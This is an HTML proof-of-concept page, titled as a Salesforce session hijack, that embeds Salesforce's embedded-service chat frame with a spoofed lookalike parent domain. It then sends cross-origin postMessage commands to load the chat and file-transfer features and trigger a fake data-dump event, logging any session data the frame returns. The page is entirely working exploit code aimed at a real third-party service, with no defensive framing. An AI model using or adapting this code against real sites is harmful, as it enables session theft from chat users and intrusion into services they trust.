<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Session Hijack PoC</title>
</head>
<body>
  <h1>Salesforce PoC: Real Session Interaction</h1>
  <iframe id="eswFrame"
    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
    style="width:100%;height:600px;"
    onload="beginHijack()"
    allow="camera *; microphone *;">
  </iframe>

  <script>
    let targetFrame = null;

    function beginHijack() {
      console.log("[+] Iframe loaded (Salesforce 4.0)");
      targetFrame = document.getElementById("eswFrame").contentWindow;

      // Send feature loader (enable chasitor API)
      ["chasitor", "filetransfer"].forEach(feature => {
        console.log(`ðŸ“¤ Sending script.load for feature: '${feature}'`);
        targetFrame.postMessage({ method: "script.load", feature }, "*");
      });

      // Delay to let chasitor load
      setTimeout(() => {
        console.log("ðŸ“¤ Sending fake event to trigger session info leak");
        targetFrame.postMessage({
          method: "liveagent.event",
          data: {
            event: "chasitorDataDump",
            params: { key: "POC", value: "Session hijack attempt" }
          }
        }, "*");
      }, 3000);
    }

    window.addEventListener("message", (event) => {
      console.log("ðŸ“© Message from iframe:", event.data);
    });
  </script>
</body>
</html>
